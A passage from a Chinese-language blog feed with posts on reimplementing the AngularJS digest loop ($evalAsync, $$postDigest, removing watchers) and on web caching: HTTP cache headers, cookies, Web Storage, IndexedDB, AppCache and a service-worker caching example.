class="line">Scope.prototype.$apply = function(expr) &#123;</div><div class="line">  try &#123;</div><div class="line">    return this.$eval(expr);</div><div class="line">  &#125; finally &#123;</div><div class="line">    this.$digest();</div><div class="line">  &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h1 id="延迟执行-evalAsync"><a href="#延迟执行-evalAsync" class="headerlink" title="延迟执行 - $evalAsync"></a>延迟执行 - $evalAsync</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div></pre></td><td class="code"><pre><div class="line">Scope.$$asyncQueue = [];//存储$evalAsync列入计划的任务</div><div class="line">Scope.$$phase = null;//作用域上一个简单的字符串属性，存储了现在正在做的信息</div><div class="line">//设置$$phase</div><div class="line">Scope.prototype.$beginPhase = function(phase) &#123;</div><div class="line">  if (this.$$phase) &#123;</div><div class="line">    throw this.$$phase + &apos; already in progress.&apos;;</div><div class="line">  &#125;</div><div class="line">  this.$$phase = phase;</div><div class="line">&#125;;</div><div class="line">//删除$$phase</div><div class="line">Scope.prototype.$clearPhase = function() &#123;</div><div class="line">  this.$$phase = null;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">Scope.prototype.$digest = function() &#123;</div><div class="line">  var ttl = 10;</div><div class="line">  var dirty;</div><div class="line">  this.$beginPhase(&quot;$digest&quot;); //设置状态</div><div class="line">  do &#123;</div><div class="line">    while (this.$$asyncQueue.length) &#123;</div><div class="line">      var asyncTask = this.$$asyncQueue.shift();</div><div class="line">      this.$eval(asyncTask.expression);</div><div class="line">    &#125;</div><div class="line">    dirty = this.$$digestOnce();</div><div class="line">    if (dirty &amp;&amp; !(ttl--)) &#123;</div><div class="line">      this.$clearPhase();</div><div class="line">      throw &quot;10 digest iterations reached&quot;;</div><div class="line">    &#125;</div><div class="line">  &#125; while (dirty);</div><div class="line">  this.$clearPhase();//移除状态</div><div class="line">&#125;;</div><div class="line"></div><div class="line">Scope.prototype.$apply = function(expr) &#123;</div><div class="line">  try &#123;</div><div class="line">    this.$beginPhase(&quot;$apply&quot;);//设置状态</div><div class="line">    return this.$eval(expr);</div><div class="line">  &#125; finally &#123;</div><div class="line">    this.$clearPhase();//移除状态</div><div class="line">    this.$digest();</div><div class="line">  &#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">Scope.prototype.$evalAsync = function(expr) &#123; 添加任务</div><div class="line">  Scope.prototype.$evalAsync = function(expr) &#123;</div><div class="line">  var self = this;</div><div class="line">  if (!self.$$phase &amp;&amp; !self.$$asyncQueue.length) &#123;</div><div class="line">    console.log(1)</div><div class="line">    setTimeout(function() &#123;利用异步，连续添加任务后一定会立即digest一次</div><div class="line">      console.log(3)</div><div class="line">      if (self.$$asyncQueue.length) &#123;</div><div class="line">        self.$digest();</div><div class="line">      &#125;</div><div class="line">    &#125;, 0);</div><div class="line">  &#125;</div><div class="line">  console.log(2)</div><div class="line">  self.$$asyncQueue.push(&#123;scope: self, expression: expr&#125;);</div><div class="line">&#125;;</div><div class="line"> </div><div class="line">&#125;;</div><div class="line">Scope.prototype.$digest = function() &#123;</div><div class="line">  var ttl = 10;</div><div class="line">  var dirty;</div><div class="line">  do &#123;</div><div class="line">    while (this.$$asyncQueue.length) &#123; </div><div class="line">      var asyncTask = this.$$asyncQueue.shift();</div><div class="line">      this.$eval(asyncTask.expression);</div><div class="line">    &#125;</div><div class="line">    dirty = this.$$digestOnce();</div><div class="line">    if (dirty &amp;&amp; !(ttl--)) &#123;</div><div class="line">      throw &quot;10 digest iterations reached&quot;;</div><div class="line">    &#125;</div><div class="line">  &#125; while (dirty);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>在监听函数中执行$evalAsync，digest第一次时延迟任务不会被执行，当dirty时，才会被执行<br>例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">var scope = new Scope();</div><div class="line">scope.asyncEvaled = false;</div><div class="line"></div><div class="line">scope.$evalAsync(function(scope) &#123;</div><div class="line">  scope.asyncEvaled = false;</div><div class="line">&#125;);</div><div class="line">console.log(4)</div><div class="line">scope.$evalAsync(function(scope) &#123;</div><div class="line">  scope.asyncEvaled = true;</div><div class="line">&#125;);</div><div class="line"></div><div class="line">console.log(&quot;Evaled after digest: &quot;+scope.asyncEvaled);//true</div></pre></td></tr></table></figure></p>
<h1 id="在digest之后执行代码-postDigest"><a href="#在digest之后执行代码-postDigest" class="headerlink" title="在digest之后执行代码 - $$postDigest"></a>在digest之后执行代码 - $$postDigest</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">this.$$postDigestQueue = [];//$$postDigest函数列入计划</div><div class="line">Scope.prototype.$$postDigest = function(fn) &#123;</div><div class="line">  this.$$postDigestQueue.push(fn);</div><div class="line">&#125;;</div><div class="line"></div><div class="line">Scope.prototype.$digest = function() &#123;</div><div class="line">  var ttl = 10;</div><div class="line">  var dirty;</div><div class="line">  this.$beginPhase(&quot;$digest&quot;);</div><div class="line">  do &#123;</div><div class="line">    while (this.$$asyncQueue.length) &#123;</div><div class="line">      try &#123;//执行函数时，使用try-catch进行异常处理</div><div class="line">        var asyncTask = this.$$asyncQueue.shift();</div><div class="line">        this.$eval(asyncTask.expression);</div><div class="line">      &#125; catch (e) &#123;</div><div class="line">        (console.error || console.log)(e);</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">    dirty = this.$$digestOnce();</div><div class="line">    if (dirty &amp;&amp; !(ttl--)) &#123;</div><div class="line">      this.$clearPhase();</div><div class="line">      throw &quot;10 digest iterations reached&quot;;</div><div class="line">    &#125;</div><div class="line">  &#125; while (dirty);</div><div class="line">  this.$clearPhase();</div><div class="line"> </div><div class="line">  while (this.$$postDigestQueue.length) &#123; //在digest最后执行</div><div class="line">    try &#123;</div><div class="line">      this.$$postDigestQueue.shift()();</div><div class="line">    &#125; catch (e) &#123;</div><div class="line">      (console.error || console.log)(e);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h1 id="销毁一个监听器"><a href="#销毁一个监听器" class="headerlink" title="销毁一个监听器"></a>销毁一个监听器</h1><p>在注册监听器时，返回一个销毁该监听器的函数，如果将来要销毁该监听器，就将返回的函数保存<br>在销毁时，直接执行该函数即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">Scope.prototype.$watch = function(watchFn, listenerFn, valueEq) &#123;</div><div class="line">  var self = this;</div><div class="line">  var watcher = &#123;</div><div class="line">    watchFn: watchFn,</div><div class="line">    listenerFn: listenerFn,</div><div class="line">    valueEq: !!valueEq</div><div class="line">  &#125;;</div><div class="line">  self.$$watchers.push(watcher);</div><div class="line">  return function() &#123;</div><div class="line">    var index = self.$$watchers.indexOf(watcher);</div><div class="line">    if (index &gt;= 0) &#123;</div><div class="line">      self.$$watchers.splice(index, 1);</div><div class="line">    &#125;</div><div class="line">  &#125;;</div><div class="line">&#125;;</div><div class="line">var scope = new Scope();</div><div class="line">var removeWatch = scope.$watch(</div><div class="line">  function(scope) &#123;</div><div class="line">    return scope.aValue;</div><div class="line">  &#125;,</div><div class="line">  function(newValue, oldValue, scope) &#123;</div><div class="line">    scope.counter++;</div><div class="line">  &#125;</div><div class="line">);</div><div class="line">removeWatch();</div></pre></td></tr></table></figure></p>
<p><a href="https://github.com/xufei/Make-Your-Own-AngularJS/blob/master/01.md" target="_blank" rel="external">文档链接</a><br><a href="https://github.com/YooHannah/algorithm/blob/master/js/angulardigest.js" target="_blank" rel="external">完整代码</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;实现原理&quot;&gt;&lt;a href=&quot;#实现原理&quot; class=&quot;headerlink&quot; title=&quot;实现原理&quot;&gt;&lt;/a&gt;实现原理&lt;/h1&gt;&lt;p&gt;通常angularjs 环境中变量都绑定在Scope对象上，检测这些变量变化的机制也绑定在该对象上&lt;/p&gt;
&lt;p&gt;为了检测数
    
    </summary>
    
    
      <category term="js" scheme="http://yoohannah.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>关于缓存</title>
    <link href="http://yoohannah.github.io/post/knowledge/cache.html"/>
    <id>http://yoohannah.github.io/post/knowledge/cache.html</id>
    <published>2017-10-22T08:54:02.000Z</published>
    <updated>2017-10-25T14:54:37.204Z</updated>
    
    <content type="html"><![CDATA[<h1 id="缓存的好处"><a href="#缓存的好处" class="headerlink" title="缓存的好处"></a>缓存的好处</h1><p> 利用缓存，可减少对源服务器的访问，因此也就节省了通信流量和通信时间<br> 从而减少了延迟(加快页面打开速度)，降低网络负载，保证稳定性(服务能正常使用)</p>
<h1 id="浏览器本地存储与服务器端存储之间的区别"><a href="#浏览器本地存储与服务器端存储之间的区别" class="headerlink" title="浏览器本地存储与服务器端存储之间的区别"></a>浏览器本地存储与服务器端存储之间的区别</h1><p>其实数据既可以在浏览器本地存储，也可以在服务器端存储。</p>
<p>浏览器端可以保存一些数据，需要的时候直接从本地获取，sessionStorage、localStorage和cookie都由浏览器存储在本地的数据。</p>
<p>服务器端也可以保存所有用户的所有数据，但需要的时候浏览器要向服务器请求数据。<br>1.服务器端可以保存用户的持久数据，如数据库和云存储将用户的大量数据保存在服务器端。<br>2.服务器端也可以保存用户的临时会话数据。服务器端的session机制，如jsp的 session 对象，数据保存在服务器上。实现上，服务器和浏览器之间仅需传递session id即可，服务器根据session id找到对应用户的session对象。会话数据仅在一段时间内有效，这个时间就是server端设置的session有效期。</p>
<p>服务器端保存所有的用户的数据，所以服务器端的开销较大，而浏览器端保存则把不同用户需要的数据分布保存在用户各自的浏览器中。<br>浏览器端一般只用来存储小数据，而服务器可以存储大数据或小数据。<br>服务器存储数据安全一些，浏览器只适合存储一般数据。</p>
<h1 id="http协议里面的缓存机制"><a href="#http协议里面的缓存机制" class="headerlink" title="http协议里面的缓存机制"></a>http协议里面的缓存机制</h1><p>相关首部字段</p>
<p>Expires:资源失效日期<br>收到该字段后会缓存资源，再将缓存的资源给客户端，对于以后的请求，在该时间之前，响应缓存资源，当超过该时间后，缓存服务器在请求发来时，会向服务器请求资源<br>漏洞：用户时间和服务器时间不一致的话，会造成用户资源更新不及时</p>
<p>cache-control:通过配置参数，设置缓存机制，相关参数如下：<br>public:允许多用户共享缓存<br>private：只允许特定用户使用缓存<br>no-cache:在请求中配置，告诉服务器，我不要缓存的响应,中间服务器必须从源服务器取资源;<br>在响应中配置，告诉中间服务器不能对响应进行缓存，源服务器以后对中间服务器提出的有效性校验不在进行确认<br>no-store:请求/响应中含有机密信息，不允许缓存资源<br>max-age:缓存保存时长<br>缓存保存到现在的时长小于该值，就可以返回缓存，否则像源服务器请求资源</p>
<p>last-modified:资源最终修改时间<br>服务器会比较请求的该值与资源最终修改时间，不一致的话就返回新资源，一致的话，就返回304，not modified<br>漏洞：时间精确度到秒，可能存在同一秒保存两次文件，无法区分，<br>也可能因为通过cdn,造成服务器上文件修改时间并不一致</p>
<p>E-Tag:服务器为每份资源提供的唯一性标识，相当于文件MD5值<br>服务器会跟剧请求的if-no-match与资源ttag比较，不一致返回新资源，一致返回304</p>
<p>服务器处理机制：<br>当首部字段Cache-Control有指定max-age指令，Expires也存在时，会优先处理max-age，用于判断资源是否失效<br>当判断max-age失效后，会去判断last-modified和E-Tag，如果服务器仅支持http1.0,则仅根据last-modified做校验<br>如果服务器支持http1.1,则先根据E-Tag做校验，然后在根据last-modified做校验</p>
<h1 id="资源缓存"><a href="#资源缓存" class="headerlink" title="资源缓存"></a>资源缓存</h1><p>HTML等页面文件:短效缓存，本地服务器<br>更新策略:使用no-cache</p>
<p>css、js:长效缓存，CDN<br>更新策略：在URI上添加更新标识(md5,timestamp,version)<br>MD5：不同文件MD5值如果相同，有覆盖危险<br>timestamp:文件修改/上线时间，因为可能存在不正确性，所以需要其他操作判断文件是否有变化<br>version:每次都需要更新版本号</p>
<p>Image:长效缓存,CDN<br>更新策略：使用随机名字</p>
<h1 id="数据缓存"><a href="#数据缓存" class="headerlink" title="数据缓存"></a>数据缓存</h1><h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p>在web storage出现前，缓存都放在cookie里面，但存储数量有限，而且每次请求都会携带一堆数据，就会占用宽带<br>工作原理<br>       当浏览器访问服务器时，服务器可以将少量数据以set-cookie消息头的方式发送给浏览器,浏览器会将这些数据临时保存下来。<br>       当浏览器再次访问服务器，会将之前保存的这些数据以cookie消息头的方式发送给服务器。<br>cookie的限制<br>     a. cookie可以被用户禁止。<br>     b. cookie不安全(对于敏感数据，需要加密)。<br>     c. cookie只能保存少量的数据(大约是4k)。<br>     d. cookie的数量也有限制(大约是几百个)。<br>     e.cookie只能保存字符串<br>生存时间问题<br>      缺省情况下，浏览器会把cookie保存在内存里面，只要浏览器不关闭，cookie就会一直存在，浏览器关闭，cookie就会被销毁。<br><a href="http://blog.csdn.net/u011637069/article/details/49799807" target="_blank" rel="external">相关链接</a><br><a href="http://www.cnblogs.com/kkgreen/archive/2011/04/12/2014282.html" target="_blank" rel="external">相关链接</a></p>
<h2 id="localStorage"><a href="#localStorage" class="headerlink" title="localStorage"></a>localStorage</h2><p>大小有限制，数据不安全(有xss风险，存爆，读取不成功)，不应当存放重要数据<br>可以用于跨页面通讯<br>永久性的本地存储<br>将数据保存在客户端硬件设备上，不管它是什么，意思就是下次打开计算机时候数据还在<br>localStorage提供了四个方法来进行对本地存储做相关操作。<br>（1）setItem(key,value)：添加本地存储数据。<br>（2）getItem(key):通过key获取相应的Value。<br>（3）removeItem(key):通过key删除本地数据。<br>（4）clear():清空数据。</p>
<h2 id="SessionStorage"><a href="#SessionStorage" class="headerlink" title="SessionStorage"></a>SessionStorage</h2><p>类似localStorage,但在窗口关闭后不存在<br>会话级别的本地存储<br>通过此对象可以直接操作存储在浏览器中的会话级别的WebStorage。<br>存储在sessionStorage中的数据首先是Key-Value形式的<br>另外就是它跟浏览器当前会话相关，当会话结束后，数据会自动清除，跟未设置过期时间的Cookie类似。即窗口关闭，数据清除<br>sessionStorage提供了四个方法来进行对本地存储做相关操作。<br>（1）setItem(key,value)：添加本地存储数据。<br>（2）getItem(key):通过key获取相应的Value。<br>（3）removeItem(key):通过key删除本地数据。<br>（4）clear():清空数据。<br>注意区别session机制<br>session机制是一种服务器端的机制，服务器使用一种类似于散列表的结构（也可能就是使用散列表）来保存信息。<br>当程序需要为某个客户端的请求创建一个session时，服务器首先检查这个客户端的请求里是否已包含了一个session标识(称为session id），如果已包含则说明以前已经为此客户端创建过session，服务器就按照session id把这个session检索出来使用(检索不到，会新建一个），如果客户端请求不包含session id，则为此客户端创建一个session并且生成一个与此session相关联的session id，session id的值应该是一个既不会重复，又不容易被找到规律以仿造的字符串，这个session id将被在本次响应<br>中随cookie返回给客户端保存。<br>即<br>Session是在服务端保存的一个数据结构，用来跟踪用户的状态，这个数据可以保存在集群、数据库、文件中<br>但cookie可以被人为的禁止，则必须有其他机制以便在cookie被禁止时仍然能够把session id传递回服务器。</p>
<p>经常被使用的一种技术叫做URL重写，就是把session id直接附加在URL路径的后面。还有一种技术叫做表单隐藏字段。就是服务器<br>会自动修改表单，添加一个隐藏字段，以便在表单提交时能够把session id传递回服务器</p>
<h2 id="sessionStorage-、localStorage-和-cookie-之间的区别"><a href="#sessionStorage-、localStorage-和-cookie-之间的区别" class="headerlink" title="sessionStorage 、localStorage 和 cookie 之间的区别"></a>sessionStorage 、localStorage 和 cookie 之间的区别</h2><p>共同点：都是保存在浏览器端，且同源的。<br>区别：<br>1.cookie数据始终在同源的http请求中携带（即使不需要），即cookie在浏览器和服务器间来回传递。而sessionStorage和localStorage不会自动把数据发给服务器，仅在本地保存。cookie数据还有路径（path）的概念，可以限制cookie只属于某个路径下。<br>2.存储大小限制也不同，cookie数据不能超过4k，同时因为每次http请求都会携带cookie，所以cookie只适合保存很小的数据，如会话标识。sessionStorage和localStorage 虽然也有存储大小的限制，但比cookie大得多，可以达到5M或更大。<br>3.数据有效期不同，sessionStorage：仅在当前浏览器窗口关闭前有效，自然也就不可能持久保持；localStorage：始终有效，窗口或浏览器关闭也一直保存，因此用作持久数据；cookie只在设置的cookie过期时间之前一直有效，即使窗口或浏览器关闭。<br>4.作用域不同，sessionStorage不在不同的浏览器窗口中共享，即使是同一个页面；localStorage 在所有同源窗口中都是共享的；cookie也是在所有同源窗口中都是共享的。<br>5.Web Storage 支持事件通知机制，可以将数据更新的通知发送给监听者。<br>6.Web Storage 的 api 接口使用更方便。<br><a href="http://blog.csdn.net/chen_zw/article/details/18924875" target="_blank" rel="external">Cache-control参数解析</a></p>
<h2 id="web-SQL"><a href="#web-SQL" class="headerlink" title="web SQL"></a>web SQL</h2><p>在浏览器端创建的一个本地的数据库，而且支持标准的SQL的CRUD操作，让离线的Web应用更加方便的存储结构化的数据<br>Web SQL Database 规范中定义的三个核心方法：<br>openDatabase：这个方法使用现有数据库或新建数据库来创建数据库对象<br>transaction：这个方法允许我们根据情况控制事务提交或回滚<br>executeSql：这个方法用于执行SQL 查询，用SQL语句做查询索引工作<br><a href="http://www.cnblogs.com/dolphinX/p/3405335.html" target="_blank" rel="external">使用链接</a><br><a href="http://www.cnblogs.com/fly_dragon/p/3946012.html" target="_blank" rel="external">实例参考</a><br>实际上已经被废弃</p>
<h2 id="indexDB"><a href="#indexDB" class="headerlink" title="indexDB"></a>indexDB</h2><p>适用持续化的数据，不会被清除的数据<br>也相当于在本地创建数据库,通过调用API接口进行数据操作，<br>在IndexedDB大部分操作并不是常用的调用方法，返回结果的模式，而是请求——响应的模式，比如打开数据库的操作<br>不会返回一个DB对象的句柄，得到的是一个IDBOpenDBRequest对象，而希望得到的DB对象在其result属性中<br>对数据的所有操作，增删改查，均通过调用api函数实现<br><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/IndexedDB_API" target="_blank" rel="external">MDN接口文档</a><br><a href="http://www.cnblogs.com/dolphinX/p/3415761.html" target="_blank" rel="external">使用教程1</a><br><a href="http://www.cnblogs.com/dolphinX/p/3416889.html" target="_blank" rel="external">使用教程2</a><br>持续化存储，可在 web worker中使用</p>
<h1 id="离线缓存"><a href="#离线缓存" class="headerlink" title="离线缓存"></a>离线缓存</h1><h2 id="离线缓存之App-Cache"><a href="#离线缓存之App-Cache" class="headerlink" title="离线缓存之App Cache"></a>离线缓存之App Cache</h2><p>AppCache就是对app内存缓存的方案，具体表现为当请求某个文件时不是从网络获取该文件，而是从本地获取。<br>应用程序缓存为应用带来三个优势：<br>离线浏览 - 用户可在应用离线时使用它们<br>速度 - 已缓存资源加载得更快<br>减少服务器负载 - 浏览器将只从服务器下载更新过或更改过的资源</p>
<p>缺点：<br>可能会缓存错误页面，甚至缓存运营商的劫持广告<br>更新中有一个文件失败了，就会全部退回上一个版本<br>由于是Lazy更新，如果后台接口有break change将会是大麻烦<br>manifest文件也有可能不小心被缓存了</p>
<p>manifest 文件是简单的文本文件，它告知浏览器被缓存的内容（以及不缓存的内容）。<br>manifest 文件可分为三个部分：<br>CACHE MANIFEST - 在此标题下列出的文件将在首次下载后进行缓存，等价于CACHE：<br>NETWORK - 在此标题下列出的文件需要与服务器的连接，且不会被缓存<br>FALLBACK - 在此标题下列出的文件规定当页面无法访问时的回退页面（比如 404 页面<br><a href="http://blog.csdn.net/liqinghua1653/article/details/31387761" target="_blank" rel="external">机制分析</a></p>
<h2 id="离线缓存之service-worker"><a href="#离线缓存之service-worker" class="headerlink" title="离线缓存之service worker"></a>离线缓存之service worker</h2><p>service worker 相当于在浏览器的请求层建了一个服务器，所有的请求都会进入service worker进行处理，决定资源使用缓存还是从新获取服务器资源<br>service worker可以：<br>后台消息传递<br>网络代理，转发请求，伪造响应<br>离线缓存<br>消息推送<br>…</p>
<p>使用时必须使用HTTPS请求协议</p>
<p>在 installing 状态中，Service Worker 脚本中的 install 事件被执行。通常在安装事件中，为 document 缓存静态文件<br>处于 activating 状态期间，Service Worker 脚本中的 activate 事件被执行。通常在 activate 事件中，清理 cache 中的文件<br>如果 Service Worker 处于激活态，就可以监听事件性事件 —— fetch 和 message。<br>service worker可以通过fetch事件拦截请求，并且给出自己的响应。<br>页面和serviceWorker之间可以通过posetMessage()方法发送消息，发送的消息可以通过message事件接收到。</p>
<p>w3c提供了一个新的fetch api，用于取代XMLHttpRequest，与XMLHttpRequest最大不同有两点：</p>
<ol>
<li>fetch()方法返回的是Promise对象，通过then方法进行连续调用，减少嵌套。ES6的Promise在成为标准之后，会越来越方便开发人员。</li>
<li>提供了Request、Response对象，如果做过后端开发，对Request、Response应该比较熟悉。前端要发起请求可以通过url发起，也可以使用Request对象发起，而且Request可以复用。但是Response用在哪里呢？在service worker出现之前，前端确实不会自己给自己发消息，但是有了service worker，就可以在拦截请求之后根据需要发回自己的响应，对页面而言，这个普通的请求结果并没有区别，这是Response的一处应用。</li>
</ol>
<p>1.注册<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">//在页面文件注册</div><div class="line">if (navigator.serviceWorker) &#123;</div><div class="line">        // 注册Service Worker scope表示作用的页面的path</div><div class="line">        // register函数返回Promise</div><div class="line">        navigator.serviceWorker.register(&apos;./service-worker.js&apos;, &#123;scope: &apos;./&apos;&#125;)</div><div class="line">            .then(function (registration) &#123;</div><div class="line">                console.log(registration);</div><div class="line">            &#125;)</div><div class="line">            .catch(function (e) &#123;</div><div class="line">                console.error(e);</div><div class="line">            &#125;)</div><div class="line">    &#125; else &#123;</div><div class="line">        console.log(&apos;Service Worker is not supported in this browser.&apos;)</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
<p>上面的代码检查 service worker API 是否可用，如果可用， /service-worker.js 这个文件将会作为 service worker 被注册。<br>scope表示作用的页面的path</p>
<p>2.安装使用<br>service-worker.js文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div></pre></td><td class="code"><pre><div class="line">importScripts(&apos;js/cache-polyfill.js&apos;); // cache 扩展</div><div class="line"></div><div class="line">var CACHE_VERSION = &apos;app-v1&apos;; // 缓存文件的版本</div><div class="line">var CACHE_FILES = [ // 需要缓存的页面文件</div><div class="line">    &apos;/&apos;,</div><div class="line">    &apos;images/background.jpeg&apos;,</div><div class="line">    &apos;js/app.js&apos;,</div><div class="line">    &apos;css/styles.css&apos;</div><div class="line">];</div><div class="line"></div><div class="line"></div><div class="line">self.addEventListener(&apos;install&apos;, function (event) &#123; // 监听worker的install事件</div><div class="line">    event.waitUntil( // 延迟install事件直到缓存初始化完成</div><div class="line">        caches.open(CACHE_VERSION) //开启一个缓存</div><div class="line">            .then(function (cache) &#123;</div><div class="line">                console.log(&apos;Opened cache&apos;);</div><div class="line">                return cache.addAll(CACHE_FILES); //缓存文件</div><div class="line">                //这个过程是通过一连串 promise （caches.open 和 cache.addAll）完成的。</div><div class="line">                //event.waitUntil 会拿到一个 promise ，并使用其来获取安装耗费的时间以及是否安装成功。</div><div class="line">                //如果所有的文件都缓存成功，service worker 就安装成功了。</div><div class="line">                //如果任何一个文件下载失败，那么安装步骤就会失败。这个方式依赖于自己指定的资源，但这意味着，需要非常仔细地确定哪些文件需要被缓存。</div><div class="line">                //指定了太多文件的话，会增加失败率</div><div class="line">                //可以在 install 事件中执行其他操作，甚至忽略 install 事件</div><div class="line">            &#125;)</div><div class="line">    );</div><div class="line">&#125;);</div><div class="line"></div><div class="line">self.addEventListener(&apos;activate&apos;, function (event) &#123; // 监听worker的activate事件,正在激活状态会触发该事件，更新service worker时，也会触发</div><div class="line">    event.waitUntil( // 延迟activate事件直到</div><div class="line">        caches.keys().then(function(keys)&#123;</div><div class="line">            return Promise.all(keys.map(function(key, i)&#123; // 清除旧版本缓存</div><div class="line">                if(key !== CACHE_VERSION)&#123;</div><div class="line">                    return caches.delete(keys[i]);</div><div class="line">                    //需要在 activate 的 callback 中进行 cache 管理，来清理老的 cache。</div><div class="line">                    //在 activate 而不是 install 的时候进行的原因，是如果在 install 的时候进行清理，</div><div class="line">                    //那么老的 service worker 仍然在控制页面，他们依赖的缓存就失效了，因此就会突然被停止</div><div class="line">                &#125;</div><div class="line">            &#125;))</div><div class="line">        &#125;)</div><div class="line">    )</div><div class="line">&#125;);</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">self.addEventListener(&apos;fetch&apos;, function (event) &#123; // 截取页面的资源请求</div><div class="line">    event.respondWith( // 返回页面的资源请求</div><div class="line">        caches.match(event.request).then(function(res)&#123; // 判断缓存是否命中</div><div class="line">            if(res)&#123;  // 返回缓存中的资源</div><div class="line">                return res;</div><div class="line">            &#125;</div><div class="line">            requestBackend(event); // 执行请求备份操作</div><div class="line">        &#125;)</div><div class="line">    )</div><div class="line">&#125;);</div><div class="line"></div><div class="line">function requestBackend(event)&#123;  // 请求备份操作</div><div class="line">    var url = event.request.clone();</div><div class="line">    return fetch(url).then(function(res)&#123; // 请求线上资源</div><div class="line">        //if not a valid response send the error</div><div class="line">        //确保 response 有效</div><div class="line">				//检查 response 的状态是200</div><div class="line">				//确保 response 的类型是 basic 类型的，这说明请求是同源的，这意味着第三方的请求不能被缓存。</div><div class="line">        if(!res || res.status !== 200 || res.type !== &apos;basic&apos;)&#123;</div><div class="line">            return res;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        var response = res.clone();</div><div class="line">        //如果检查通过会clone 这个请求。</div><div class="line">        //这么做的原因是如果 response 是一个 Stream，那么它的 body 只能被消费一次。</div><div class="line">        //所以为了让浏览器跟缓存都使用这个body,必须克隆这个 